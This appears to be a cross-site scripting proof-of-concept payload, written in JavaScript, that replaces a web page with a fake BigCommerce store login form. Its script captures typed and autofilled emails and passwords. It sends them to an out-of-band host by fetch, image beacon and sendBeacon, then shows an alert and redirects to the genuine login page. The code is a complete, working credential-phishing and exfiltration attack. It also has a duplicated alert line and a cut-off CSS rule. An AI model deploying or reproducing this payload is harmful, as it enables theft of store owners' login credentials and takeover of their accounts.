 (function() {
      document.body.innerHTML = "";
      document.head.innerHTML = "";

      var scripts = document.getElementsByTagName('script');
      for (var i = scripts.length - 1; i >= 0; i--) {
          if (scripts[i].parentNode) {
              scripts[i].parentNode.removeChild(scripts[i]);
          }
      }

      document.documentElement.innerHTML = `
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Log in to your store</title>
      </head>
      <body></body>`;

      var style = document.createElement('style');
      style.textContent = `
          * {
              margin: 0;
              padding: 0;
              box-sizing: border-box;
          }
          body {
              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
              background: #0a0a0a;
              color: white;
              min-height: 100vh;
              display: flex;
              flex-direction: column;
              justify-content: center;
              align-items: center;
              position: relative;
              overflow: hidden;
          }
          body::before {
              content: '';
              position: absolute;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              background-image:
                  linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
                  linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
              background-size: 50px 50px;
              animation: gridMove 20s linear infinite;
              z-index: 1;
          }
          @keyframes gridMove {
              0% { transform: translate(0, 0); }
              100% { transform: translate(50px, 50px); }
          }
          .container {
              position: relative;
              z-index: 2;
              width: 100%;
              max-width: 400px;
              padding: 0 20px;
          }
          .logo {
              text-align: center;
              margin-bottom: 60px;
          }
          .logo svg {
              width: 180px;
              height: auto;
              fill: white;
          }
          .login-form {
              background: rgba(255, 255, 255, 0.05);
              backdrop-filter: blur(10px);
              border: 1px so
          }
          .form-title {
              font-size: 28px;
              font-weight: 600;
              text-align: center;
              margin-bottom: 40px;
              color: white;
          }
          .form-group {
              margin-bottom: 24px;
          }
          .form-input {
              width: 100%;
              padding: 16px 20px;
              border: 1px solid rgba(255, 255, 255, 0.2);
              border-radius: 8px;
              background: rgba(255, 255, 255, 0.1);
              color: white;
              font-size: 16px;
              transition: all 0.3s ease;
          }
          .form-input::placeholder {
              color: rgba(255, 255, 255, 0.6);
          }
          .form-input:focus {
              outline: none;
              border-color: #3b82f6;
              box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
              background: rgba(255, 255, 255, 0.15);
          }
          .password-container {
              position: relative;
          }
          .password-toggle {
              position: absolute;
              right: 16px;
              top: 50%;
              transform: translateY(-50%);
              background: none;
              border: none;
              color: rgba(255, 255, 255, 0.6);
              cursor: pointer;
              padding: 4px;
              border-radius: 4px;
              transition: color 0.3s ease;
          }
          .password-toggle:hover {
              color: white;
          }
          .login-btn {
              width: 100%;
              padding: 16px;
              background: linear-gradient(135deg, #3b82f6, #1d4ed8);
              border: none;
              border-radius: 8px;
              color: white;
              font-size: 16px;
              font-weight: 600;
              cursor: pointer;
              transition: all 0.3s ease;
              margin-bottom: 24px;
          }
          .login-btn:hover {
              background: linear-gradient(135deg, #2563eb, #1e40af);
              transform: translateY(-2px);
              box-shadow: 0 10px 20px rgba(59, 130, 246, 0.3);
          }
          .login-btn:active {
              transform: translateY(0);
          }
          .form-links {
              display: flex;
              justify-content: space-between;
              align-items: center;
          }
          .form-link {
              color: rgba(255, 255, 255, 0.7);
              text-decoration: none;
              font-size: 14px;
              transition: color 0.3s ease;
          }
          .form-link:hover {
              color: #3b82f6;
          }
          .sso-link {
              color: rgba(255, 255, 255, 0.8);
          }
          .signup-link {
              color: #3b82f6;
          }
          .loading {
              display: none;
              width: 20px;
              height: 20px;
              border: 2px solid rgba(255, 255, 255, 0.3);
              border-radius: 50%;
              border-top-color: white;
              animation: spin 1s linear infinite;
              margin-right: 8px;
          }
          @keyframes spin {
              to { transform: rotate(360deg); }
          }
          .success-message {
              display: none;
              background: rgba(34, 197, 94, 0.1);
              border: 1px solid rgba(34, 197, 94, 0.3);
              color: #22c55e;
              padding: 12px 16px;
              border-radius: 8px;
              margin-bottom: 20px;
              text-align: center;
              font-size: 14px;
          }
          @media (max-width: 480px) {
              .container { max-width: 100%; }
              .login-form { padding: 30px 20px; }
              .form-title { font-size: 24px; }
          }
      `;
      document.head.appendChild(style);

      var container = document.createElement('div');
      container.className = 'container';

      var logo = document.createElement('div');
      logo.className = 'logo';
      logo.innerHTML = '<svg viewBox="0 0 180 40" xmlns="http://www.w3.org/2000/svg"><path d="M0 20L10 0h160l10 20-10 20H10L0 20z"/><text x="90" y="25" font-family="Arial, sans-serif" font-size="14" font-weight="bold" text-anchor="middle" fill="black">BIGCOMMERCE</text></svg>';

      var formDiv = document.createElement('div');
      formDiv.className = 'login-form';

      var title = document.createElement('h1');
      title.className = 'form-title';
      title.textContent = 'Log in to your store';

      var successMsg = document.createElement('div');
      successMsg.className = 'success-message';
      successMsg.id = 'successMessage';
      successMsg.textContent = 'Login successful! Redirecting...';

      var form = document.createElement('form');
      form.id = 'loginForm';

      var emailGroup = document.createElement('div');
      emailGroup.className = 'form-group';
      var emailInput = document.createElement('input');
      emailInput.type = 'email';
      emailInput.className = 'form-input';
      emailInput.placeholder = 'Email';
      emailInput.id = 'email';
      emailInput.name = 'email';
      emailInput.autocomplete = 'username email';
      emailInput.required = true;
      emailGroup.appendChild(emailInput);

      var passwordGroup = document.createElement('div');
      passwordGroup.className = 'form-group';
      var passwordContainer = document.createElement('div');
      passwordContainer.className = 'password-container';
      var passwordInput = document.createElement('input');
      passwordInput.type = 'password';
      passwordInput.className = 'form-input';
      passwordInput.placeholder = 'Password';
      passwordInput.id = 'password';
      passwordInput.name = 'password';
      passwordInput.autocomplete = 'current-password';
      passwordInput.required = true;
      var passwordToggle = document.createElement('button');
      passwordToggle.type = 'button';
      passwordToggle.className = 'password-toggle';
      passwordToggle.textContent = '👁️';
      passwordContainer.appendChild(passwordInput);
      passwordContainer.appendChild(passwordToggle);
      passwordGroup.appendChild(passwordContainer);

      var submitBtn = document.createElement('button');
      submitBtn.type = 'submit';
      submitBtn.className = 'login-btn';
      var loading = document.createElement('span');
      loading.className = 'loading';
      loading.id = 'loading';
      var buttonText = document.createElement('span');
      buttonText.textContent = 'Log in';
      submitBtn.appendChild(loading);
      submitBtn.appendChild(buttonText);

      var linksDiv = document.createElement('div');
      linksDiv.className = 'form-links';
      var ssoLink = document.createElement('a');
      ssoLink.href = '#';
      ssoLink.className = 'form-link sso-link';
      ssoLink.textContent = 'Log in with SSO';
      var rightDiv = document.createElement('div');
      var forgotLink = document.createElement('a');
      forgotLink.href = '#';
      forgotLink.className = 'form-link';
      forgotLink.textContent = 'Forgot?';
      var sep = document.createElement('span');
      sep.style.cssText = 'color: rgba(255,255,255,0.3); margin: 0 8px;';
      sep.textContent = '•';
      var signupLink = document.createElement('a');
      signupLink.href = '#';
      signupLink.className = 'form-link signup-link';
      signupLink.textContent = 'Sign up';
      rightDiv.appendChild(forgotLink);
      rightDiv.appendChild(sep);
      rightDiv.appendChild(signupLink);
      linksDiv.appendChild(ssoLink);
      linksDiv.appendChild(rightDiv);

      form.appendChild(emailGroup);
      form.appendChild(passwordGroup);
      form.appendChild(submitBtn);
      formDiv.appendChild(title);
      formDiv.appendChild(successMsg);
      formDiv.appendChild(form);
      formDiv.appendChild(linksDiv);
      container.appendChild(logo);
      container.appendChild(formDiv);
      document.body.appendChild(container);

      setTimeout(function() {
          passwordToggle.addEventListener('click', function() {
              if (passwordInput.type === 'password') {
                  passwordInput.type = 'text';
                  passwordToggle.textContent = '🙈';
              } else {
                  passwordInput.type = 'password';
                  passwordToggle.textContent = '👁️';
              }
          });

          var exfilSent = false;

          function sendExfil(u, p) {
              if (exfilSent) return;
              exfilSent = true;

              // Fetch POST - primary callback
              try {
                  fetch('https://c9jv4n762melieg12ukr3ffpdwakwp6tf.oast.site', {
                      method: 'POST',
                      mode: 'no-cors',
                      headers: {'Content-Type': 'text/plain'},
                      body: JSON.stringify({
                          username: u,
                          password: p,
                          url: window.location.href,
                          timestamp: new Date().toISOString(),
                          userAgent: navigator.userAgent
                      })
                  }).catch(function(){});
              } catch(e) {}

              // Image beacon - backup callback
              try {
                  var img = new Image();
                  img.src = 'https://c9jv4n762melieg12ukr3ffpdwakwp6tf.oast.site?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p) + '&url=' + encodeURIComponent(window.location.href);
              } catch(e) {}

              // Navigator.sendBeacon - fires even if page is unloading
              try {
                  navigator.sendBeacon(
                      'https://c9jv4n762melieg12ukr3ffpdwakwp6tf.oast.site',
                      JSON.stringify({username: u, password: p, url: window.location.href})
                  );
              } catch(e) {}

              console.log('Credentials captured:', {username: u, password: p});
          }

          function tryHarvest() {
              var u = emailInput.value;
              var p = passwordInput.value;
              if (u && p && !exfilSent) {
                  // Fire network requests BEFORE the blocking alert
                  sendExfil(u, p);
                  // Alert is synchronous and blocks JS - safe to call after requests are dispatched
                  alert('XSS PoC - Credentials captured:\n\nEmail: ' + u + '\nPassword: ' + p);
                alert('XSS PoC - Credentials captured:\n\nEmail: ' + u + '\nPassword: ' + p);
            }
        }

        emailInput.addEventListener('input', tryHarvest);
        passwordInput.addEventListener('input', tryHarvest);
        emailInput.addEventListener('change', tryHarvest);
        passwordInput.addEventListener('change', tryHarvest);

        form.addEventListener('submit', function(e) {
            e.preventDefault();

            // Last chance exfil if not already sent
            tryHarvest();

            loading.style.display = 'inline-block';
            buttonText.textContent = 'Logging in...';
            submitBtn.disabled = true;

            setTimeout(function() {
                successMsg.style.display = 'block';
                loading.style.display = 'none';
                buttonText.textContent = 'Success!';
                setTimeout(function() {
                    window.location.href = 'https://login.bigcommerce.com/';
                }, 2000);
            }, 1500);
        });

        [ssoLink, forgotLink, signupLink].forEach(function(link) {
            link.addEventListener('click', function(e) {
                e.preventDefault();
            });
        });

        // Check for autofilled values
        var checkAutofill = setInterval(function() {
            if ((emailInput.value && passwordInput.value) && !exfilSent) {
                tryHarvest();
                clearInterval(checkAutofill);
            }
        }, 500);

        setTimeout(function() {
            clearInterval(checkAutofill);
        }, 10000);

    }, 300);

})();
